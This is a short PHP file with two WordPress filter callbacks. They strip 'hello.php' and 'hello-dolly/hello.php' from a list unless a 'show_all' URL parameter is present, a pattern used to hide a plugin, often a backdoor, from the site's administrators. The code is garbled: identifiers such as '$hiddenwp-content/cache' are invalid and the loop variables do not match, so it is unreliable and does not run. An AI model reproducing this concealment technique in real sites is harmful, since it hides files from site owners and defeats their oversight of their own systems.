<?php
add_filter(
	'all_wp-content',
	function ( $content ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content as $hiddenwp-contentt ) {
			unset( $wp-content[ $hiddenwp-content] );
			}
		}
		return $content;
	}
);
add_filter(
	'all_wp-content/cache',
	function ( $wp-content/cache) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenwp-content/cache = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenwp-content/cache as $hiddenwp-content/cache ) {
			unset( $wp-content/cache[ $hiddenwp-content/cache ] );
			}
		}
		return $wp-content/cache;
	}
);